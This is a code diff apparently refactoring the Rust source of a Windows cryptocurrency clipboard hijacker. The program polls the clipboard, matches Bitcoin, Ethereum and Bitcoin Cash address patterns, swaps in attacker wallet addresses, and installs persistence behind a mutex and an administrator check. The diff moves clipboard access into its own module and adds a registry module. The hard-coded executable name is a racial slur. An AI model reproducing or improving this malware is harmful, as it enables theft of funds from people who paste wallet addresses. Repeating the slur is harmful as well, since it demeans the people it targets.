@@ -1,6 +1,5 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 
-use clipboard::{windows_clipboard::WindowsClipboardContext, ClipboardProvider};
 use regex::Regex;
 use std::{
     collections::HashMap,
@@ -12,6 +11,8 @@ use std::{
 
 mod fs;
 mod os;
+mod registry;
+mod clipboard;
 
 static FILE_NAME: &str = "nigga.exe";
 static MUTEX: &str = "asdfafds9i867asdf7896";
@@ -25,17 +26,16 @@ const ETH_ADDR: &str = "dfgdg";
 const BCH_ADDR: &str = "ghgfh";
 
 fn scan(check_map: &HashMap<&str, &str>) -> Option<(String, String)> {
-    let mut cb_prov = <WindowsClipboardContext as ClipboardProvider>::new().unwrap();
+    let result = clipboard::get_clipboard_text();
 
-    let result = cb_prov.get_contents();
-
-    let mut check_set_contents = |check: &str, set: &str, clipoard_text: String| -> Option<bool> {
+    let check_set_contents = |check: &str, set: &str, clipoard_text: String| -> Option<bool> {
         if Regex::from_str(check).unwrap().is_match(&clipoard_text) {
-            if let Ok(..) = cb_prov.set_contents(
+            if clipboard::set_clipboard_text(
                 Regex::from_str(check)
                     .unwrap()
                     .replace(&clipoard_text, set)
-                    .to_string(),
+                    .to_string()
+                    .as_str()
             ) {
                 return Some(true);
             }
@@ -44,7 +44,7 @@ fn scan(check_map: &HashMap<&str, &str>) -> Option<(String, String)> {
         return None;
     };
 
-    if let Ok(clipboard_text) = result {
+    if let Some(clipboard_text) = result {
         for (regex_str, address) in check_map {
             if check_set_contents(regex_str, address, clipboard_text.clone()).is_some() {
                 return Some((
@@ -58,7 +58,7 @@ fn scan(check_map: &HashMap<&str, &str>) -> Option<(String, String)> {
     return None;
 }
 
-async fn start() {
+fn start() {
     let map: HashMap<&str, &str> = HashMap::from_iter([
         (
             r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$",
@@ -71,7 +71,7 @@ async fn start() {
         (r"^(q|1|bitcoincash:)[a-zA-HJ-NP-Z0-9]{41}$", BCH_ADDR),
     ]);
 
-    match fs::persistence().await {
+    match fs::persistence() {
         Ok(..) => loop {
             scan(&map);
             thread::sleep(Duration::from_millis(500));
@@ -80,11 +80,10 @@ async fn start() {
     };
 }
 
-#[tokio::main]
-async fn main() {
+fn main() {
     if fs::running_from_save_path() {
         if os::check_mutex() {
-            start().await;
+            start();
         }
     } else {
         if !os::is_administrator().unwrap() {
@@ -110,7 +109,7 @@ async fn main() {
                     .unwrap()
             );
 
-            start().await;
+            start();
         }
     };
 }
